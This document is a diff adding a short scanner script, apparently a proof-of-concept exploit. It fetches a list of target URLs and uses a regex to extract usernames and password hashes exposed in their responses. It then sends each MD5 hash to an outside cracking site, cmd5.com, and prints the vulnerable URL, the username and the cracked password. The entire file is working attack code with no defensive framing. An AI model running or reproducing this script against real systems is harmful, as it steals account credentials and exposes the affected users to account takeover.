@@ -1,0 +1,35 @@
+#request urls = array
+#define re = "name":"(.*?)","password":"(.*?)"
+#define post = __EVENTTARGET=Button1&__EVENTARGUMENT=&ctl00%24ContentPlaceHolder1%24TextBoxInput=md5value&ctl00%24ContentPlaceHolder1%24InputHashType=md5&ctl00%24ContentPlaceHolder1%24Button1=%E6%9F%A5%E8%AF%A2&ctl00%24ContentPlaceHolder1%24HiddenField1=
+#define qian = onmouseover="toggle();">
+#define hou = </span>
+function GetMD5Res(md5){
+	res = HttpPost("https://www.cmd5.com/",StrReplace(post,"md5value",md5),"Referer: https://www.cmd5.com/".StrRN()."User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36");
+	return GettextMiddle(res[0],qian,hou);
+}
+function Getinfo(url){
+	res = HttpGet(url,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0");
+	r = StrRe(res[0],re);
+	i = 1;
+	num = GetArrayNum(r);
+	if(num > 2){
+		va = GetMD5Res(r[2]);
+		if(GetStrLength(va) > 20){
+			print("存在漏洞:".url,"用户名:".r[1],"密码MD5:".r[2],"未找到解密的MD5");
+		}else{
+			print("存在漏洞:".url,"用户名:".r[1],"密码MD5:".r[2],"解密后的MD5:".va);
+		}
+	}
+	return "";
+}
+function main(args){
+	i = 0;
+	num = GetArrayNum(urls);
+	while(i<num){
+		try{
+			Getinfo(urls[i]);
+		}catch{
+		}
+		i = ToInt(i+1);
+	}
+}
